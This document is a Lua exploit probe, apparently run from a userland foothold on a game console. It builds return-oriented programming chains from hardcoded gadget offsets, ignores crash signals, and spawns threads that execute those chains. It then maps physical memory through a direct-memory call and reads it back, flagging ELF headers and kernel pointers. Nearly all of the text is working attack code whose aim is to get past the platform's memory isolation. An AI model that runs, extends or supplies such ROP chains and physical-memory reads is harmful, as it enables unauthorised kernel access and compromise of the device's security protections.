-- CRASH_CLASS: LOW
-- PROBE 562h: Physical memory read — exact 384b pattern (heap stack, fn_addr)
--
-- 384b has ZERO binary output. This probe replicates 384b's exact pattern:
-- 1. memory.alloc() for stack (NOT mmap)
-- 2. fn_addr from syscall.pipe.fn_addr (NOT chain[3])
-- 3. thr_exit(431) via fn_addr
-- 4. SIG_IGN for SIGSEGV+SIGSYS (like 384b)
-- 5. Wait via memory reads (like 384b), not busy loop
--
-- MINIMAL: reads 4 qwords (not 16) from phys 0x100000000.
-- If clean output → scale up. If binary → diagnose.

print("=== PROBE 562h: PHYS READ (384b pattern) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end

-- fn_addr = syscall dispatcher (EXACT 384b pattern)
local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))

local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base (EXACT 384b pattern)
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- libkernel
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local llo = rd(N(ib2) + 0x108) or 0
local lhi = rd(N(ib2) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)
print("lk=" .. fmt(lk))

-- Gadgets (EXACT 384b names)
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67   -- mov [rdi],rax; ret
local g_mov_rax_m = eb + 0x1A5CC4  -- mov rax,[rsi]; ret

-- SIG_IGN for SIGSEGV + SIGSYS (EXACT 384b pattern)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

io.flush()

-- ============================================================
-- [A] CONTROL: child with 384b-style syscall (getpid) — should be clean
-- ============================================================
print("")
print("[A] control: getpid child (384b style)")

local res_a = memory.alloc(8)
wq(N(res_a), uint64(0xBAD0BAD0))

local stk_a = memory.alloc(0x4000)  -- HEAP stack, like 384b
local sb_a = N(stk_a)
local ss_a = 0x2000
local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

local off = 0
local function ea(v) wq(rsp_a + off, v); off = off + 8 end

ea(g_pop_rax); ea(uint64(20))       -- SYS_getpid
ea(stub)
ea(g_pop_rdi); ea(uint64(N(res_a))) -- save result
ea(g_mov_m_rax)
ea(g_pop_rdi); ea(uint64(0))        -- thr_exit(0)
ea(g_pop_rax); ea(uint64(431))
ea(stub)

local pa_a = memory.alloc(0x40)
local paa = N(pa_a)
for i = 0, 0x3C, 4 do wd(paa + i, 0) end
wq(paa, g_bare_ret)
wq(paa + 8, uint64(0))
wq(paa + 0x10, uint64(sb_a))
wq(paa + 0x18, uint64(ss_a))
local tid_a = memory.alloc(8); wq(N(tid_a), uint64(0))
wq(paa + 0x30, tid_a)

print("spawning...")
local ok_ta, rv_ta = pcall(function() return mk(455)(pa_a, uint64(0x38)) end)
print("thr_new ret=" .. (ok_ta and N(rv_ta) or -999))

for w = 1, 15000 do local _ = rd(sb_a) end

local gp_raw = rq(N(res_a))
print("getpid=" .. fmt(gp_raw) .. " (expect " .. pid_val .. ")")
print("alive=" .. tostring(alive()))
io.flush()

-- ============================================================
-- [B] MapDirectMemory (no thread — should be clean)
-- ============================================================
print("")
print("[B] MapDM phys 0x100000000")

local mapped_va = uint64("0x880000000")
local sc477 = mk(477)
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), uint64(0),
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] EXPERIMENTAL: child reads from mapped physical memory
-- ============================================================
print("")
print("[C] child reads 4 qwords from mapped phys page")

local shared = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end

local nq = 4

local stk_c = memory.alloc(0x4000)
local sb_c = N(stk_c)
local ss_c = 0x2000
local rsp_c = sb_c + ss_c - ((sb_c + ss_c) % 16) - 8

off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

-- Read 4 qwords from mapped_va
for qi = 0, nq - 1 do
    ec(g_pop_rsi); ec(mapped_va + uint64(qi * 8))
    ec(g_mov_rax_m)
    ec(g_pop_rdi); ec(uint64(N(shared) + 8 + qi * 8))
    ec(g_mov_m_rax)
end

-- Sentinel
ec(g_pop_rax); ec(uint64(0xDEADFACE))
ec(g_pop_rdi); ec(uint64(N(shared)))
ec(g_mov_m_rax)

-- thr_exit(431)
ec(g_pop_rdi); ec(uint64(0))
ec(g_pop_rax); ec(uint64(431))
ec(stub)

local entry_count = off / 8
print(string.format("chain: %d entries", entry_count))

local pa_c = memory.alloc(0x40)
local pac = N(pa_c)
for i = 0, 0x3C, 4 do wd(pac + i, 0) end
wq(pac, g_bare_ret)
wq(pac + 8, uint64(0))
wq(pac + 0x10, uint64(sb_c))
wq(pac + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pac + 0x30, tid_c)

print("spawning read child...")
io.flush()
local ok_tc, rv_tc = pcall(function() return mk(455)(pa_c, uint64(0x38)) end)
print("thr_new ret=" .. (ok_tc and N(rv_tc) or -999))

-- Wait (384b style: just do reads)
for w = 1, 15000 do local _ = rd(sb_c) end

print("alive=" .. tostring(alive()))
io.flush()

-- ============================================================
-- [D] Results
-- ============================================================
print("")
print("[D] results")

local sv = rb(N(shared)) or 0
print(string.format("sentinel=0x%X", sv))

if sv == 0xDEADFACE then
    print("SENTINEL OK — child read physical memory!")
    for qi = 0, nq - 1 do
        local lo = rb(N(shared) + 8 + qi * 8) or 0
        local hi = rb(N(shared) + 8 + qi * 8 + 4) or 0
        local tag = ""
        if qi == 0 and lo == 0x464C457F then tag = " *** ELF! ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("  [+%02X] 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print("TIMEOUT — child may have crashed")
end

-- Cleanup
pcall(function() mk(73)(mapped_va, uint64(0x4000)) end)

print("")
print("final alive=" .. tostring(alive()))
print("=== 562h DONE ===")
